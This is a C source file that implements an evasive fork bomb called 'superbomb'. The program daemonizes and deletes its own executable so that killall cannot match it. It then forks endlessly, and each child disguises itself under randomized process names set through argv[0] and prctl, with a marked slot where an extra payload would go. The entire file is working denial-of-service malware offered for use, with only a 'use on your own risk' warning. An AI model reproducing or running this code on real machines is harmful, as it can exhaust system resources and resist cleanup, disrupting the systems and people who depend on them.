/*
 * 2016, gh0stwizard
 *
 *
 *                  USE ON YOUR OWN RISK!
 *
 *
 * gcc -Wall -std=gnu99 -o superbomb yafb.c
 * ./superbomb
 */

#ifdef __linux__
#include <sys/prctl.h>
#endif
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#define MAXFORKS 4

int main(int argc, char *argv[])
{
        char orig[256];
        
        char temp[16];
        pid_t cpid;
        int len, nlen;
        int count = MAXFORKS;
        int i, k;
        char *p;
        struct timespec wtime, ptime;

        len = strlen(argv[0]);
        strncpy(orig, argv[0], len);

        wtime.tv_sec = 0;
        wtime.tv_nsec = 1000000; /* 1 msec */
        
        ptime.tv_sec = 0;
        ptime.tv_nsec = 50000000; /* 50 msec */

        while ((cpid = fork()) == -1) sleep(1);
        if (cpid != 0) exit(EXIT_SUCCESS); /* daemonize */
        unlink(orig); /* killall looks for /proc/[pid]/exe */

        while (count--) {
                while ((cpid = fork()) == -1) nanosleep(&wtime, NULL);
                if (cpid) {
                        if (count == 0)
                                break; /* stop parent */
                        else
                                continue;
                }
                if ((p = malloc(sizeof(char))) == NULL) exit(EXIT_FAILURE);
                sprintf(temp, "%lx", (long unsigned int)p);
                nlen = strlen(temp) - MAXFORKS;
                char next[256];
                for (i = 0, k = count; i < len; i++, k++) {
                        if (k >= nlen)
                                k = 0;
                        next[i] = temp[k];
                }
                next[i] = '\0';
                strncpy(argv[0], next, len); /* cmdline */
#ifdef __linux__
                prctl(PR_SET_NAME, (unsigned long)next, 0, 0, 0); /* comm */
#endif
                /* payload */
                nanosleep(&ptime, NULL);
                if (count == 0)
                        count = MAXFORKS;
        }
        return 0;
}
